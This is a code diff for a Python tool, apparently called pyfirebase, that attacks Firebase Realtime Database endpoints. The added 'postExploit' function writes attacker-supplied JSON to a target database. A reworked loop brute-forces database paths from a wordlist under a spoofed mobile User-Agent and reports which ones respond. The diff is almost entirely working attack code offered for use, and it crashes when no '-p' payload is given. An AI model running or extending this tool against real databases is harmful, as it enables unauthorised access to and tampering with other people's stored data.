@@ -53,6 +53,19 @@ def echo(str, col, cha):
 
 
 
+def postExploit(url,data):
+	req    = requests.post(url,data=data)
+	result = req.status_code
+	if result   == 200:
+		echo("Success!", green, bold)
+	elif result == 400:
+		echo("Something wrong!", red, bold)
+	elif result == 404:
+		echo("Not found!", red, bold)
+	elif result == 401:
+		echo("Permission Denied!", blue, bold)
+
+
 # Main function
 def main():
 	"""
@@ -65,10 +78,12 @@ def main():
 	parser = argparse.ArgumentParser()
 	parser.add_argument("-u", "--url", help="Firebase URL", required=True, dest="url")
 	parser.add_argument("-b", "--brute", dest="txt_file")
-	
+	parser.add_argument("-p", "--post", help="Post data to target", dest="payload")
 	args    = parser.parse_args()
+	
 	URL     = args.url
 	txtFile = args.txt_file
+	payload = args.payload
 	
 	if not URL.startswith("https"):
 		echo("URL format must be in https!", red, bold)
@@ -78,27 +93,51 @@ def main():
 		echo("URL format must contain firebaseio.com", red, bold)
 		time.sleep(3)
 		os.system("clear && python3 pyfirebase.py -h")
-	
-	if txtFile.__contains__("/"):
-		isDir = os.path.isdir(txtFile)
-		if isDir:
-			getLastPath = os.path.split(txtFile)
-			print(getLastPath[1])
-		else:
-			echo("This is not a file!", red, bold)
+		
+	if payload.startswith("{") and payload.endswith("}"):
+		postExploit(URL, payload)
 	else:
 		os.system("clear")
-		with open(txtFile, 'r') as file:
-			for data in file:
-				URL = URL.replace(".json", "")
-				url = URL + data + ".json"
-				http = requests.get(url.strip())
-				print(http.text)
-				echo("Try: {}\n=>".format(data) + str(http.status_code) + "\n", green, bold)
-			file.close()
-				
+		echo("Wrong data format!\nExample: {'data':'test'}", red, bold)
+		
+	if txtFile == None:
+		pass
+	else:
+		userAgent = {"User-Agent":"Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36"}
+		try:
+			if txtFile.__contains__("/"):
+				isDir = os.path.isdir(txtFile)
+				if isDir:
+					getLastPath = os.path.split(txtFile)
+					fileTxt     = getLastPath[1]
+					os.system("clear")
+					ori         = requests.get(URL)
+					echo("Try: {} =>".format(URL) + str(ori.status_code) + "\n", green, bold)
+					with open(fileTxt, 'r') as file:
+						for data in file:
+							URL  = URL.replace(".json", "")
+							url  = URL + data + ".json"
+							http = requests.get(url.strip())
+							echo("Try: {} =>".format(url) + str(http.status_code) + "\n", green, bold)
+						file.close()
+				else:
+					echo("This is not a file!", red, bold)
+			else:
+				os.system("clear")
+				ori = requests.get(URL)
+				echo("Try: {} =>".format(URL) + str(ori.status_code) + "\n", green, bold)
+				with open(txtFile, 'r') as file:
+					for data in file:
+						URL  = URL.replace(".json", "")
+						url  = URL + data + ".json"
+						http = requests.get(url.strip())
+						echo("Try: {} =>".format(url) + str(http.status_code) + "\n", green, bold)
+					file.close()
+		except KeyboardInterrupt: # Ctrl+C to stop this
+			echo("\nBruteforce Stoped...", blue, bold)
 
 
 
+# Run the main() script
 if __name__ == '__main__':
 	main()
